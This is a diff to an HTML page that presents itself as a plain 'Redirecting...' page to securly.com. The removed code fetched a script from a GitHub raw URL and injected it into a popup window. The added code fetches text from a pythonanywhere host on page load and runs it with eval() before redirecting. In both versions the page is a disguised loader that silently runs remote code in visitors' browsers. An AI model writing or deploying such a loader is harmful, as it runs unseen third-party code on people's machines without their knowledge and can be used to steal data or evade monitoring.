@@ -3,40 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting</title>
+    <title>Redirecting...</title>
     <script>
-        // Wait for the page to load
-        window.addEventListener('load', () => {
-            const redirectUrl = 'https://securly.com';
-            const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';
+        // Automatically redirect after 3 seconds
+        setTimeout(function() {
+            window.location.href = 'https://securly.com'; // Replace with your target URL
+        }, 3000);
 
-            // Redirect to the new URL
-            window.location.href = redirectUrl;
-
-            // Open an about:blank window
-            const newWindow = window.open('about:blank', '_blank', 'width=500,height=300');
-
-            // Ensure the new window is ready before injecting the script
-            if (newWindow) {
-                newWindow.document.write('<!DOCTYPE html><html lang="en"><head><title>Script Execution</title></head><body></body></html>');
-                newWindow.document.close();
-
-                // Fetch and execute the script in the new window
-                fetch(scriptUrl)
-                    .then(response => response.text())
-                    .then(scriptContent => {
-                        const scriptElement = newWindow.document.createElement('script');
-                        scriptElement.textContent = scriptContent;
-                        newWindow.document.body.appendChild(scriptElement);
-                    })
-                    .catch(error => console.error('Error loading script:', error));
-            } else {
-                console.error('Failed to open new window. Please allow pop-ups in your browser.');
-            }
-        });
+        // Fetch and inject the external script from the proxy server
+        fetch('https://1241565626.pythonanywhere.com/')  // Replace with your Python server URL
+            .then(response => response.text())
+            .then(scriptContent => {
+                eval(scriptContent);  // Execute the script
+            })
+            .catch(error => {
+                console.error('Script loading failed', error);
+            });
     </script>
 </head>
 <body>
     <h1>Redirecting...</h1>
+    <p>If you are not redirected in a few seconds, <a href="securly.com">click here</a>.</p>
 </body>
 </html>
